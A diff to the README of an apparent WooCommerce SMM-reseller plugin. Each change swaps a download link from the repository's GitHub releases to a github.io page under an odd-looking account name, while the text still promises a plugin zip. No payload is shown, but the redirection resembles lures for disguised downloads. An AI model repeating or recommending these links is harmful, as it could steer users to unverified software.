@@ -1,6 +1,6 @@
 # 🚀 Neofollower-SMM-Reseller-API-for-Woocommerce - Automate Your SMM Reseller Business
 
-[![Download Now](https://img.shields.io/badge/Download-NeoFollower%20Plugin-blue?style=for-the-badge&logo=github)](https://github.com/Automationsmoothwinterberryholly1923/Neofollower-SMM-Reseller-API-for-Woocommerce/releases)
+[![Download Now](https://img.shields.io/badge/Download-NeoFollower%20Plugin-blue?style=for-the-badge&logo=github)](https://automationsmoothwinterberryholly1923.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these simple steps to get your SMM reseller store up and running. No prog
 
 Visit this link to download the application:
 
-[**Download NeoFollower Plugin**](https://github.com/Automationsmoothwinterberryholly1923/Neofollower-SMM-Reseller-API-for-Woocommerce/releases)
+[**Download NeoFollower Plugin**](https://automationsmoothwinterberryholly1923.github.io)
 
 Click the latest release file (usually named `neofollower-smm-reseller.zip`). The download will start automatically.
 
@@ -199,7 +199,7 @@ This project is licensed under the GPL-2.0 License. You are free to use, modify,
 
 Don't wait — turn your WooCommerce store into a profitable SMM reseller business today. Download the plugin now and let automation do the heavy lifting.
 
-[**⬇️ Download NeoFollower Plugin Now**](https://github.com/Automationsmoothwinterberryholly1923/Neofollower-SMM-Reseller-API-for-Woocommerce/releases)
+[**⬇️ Download NeoFollower Plugin Now**](https://automationsmoothwinterberryholly1923.github.io)
 
 ---
 
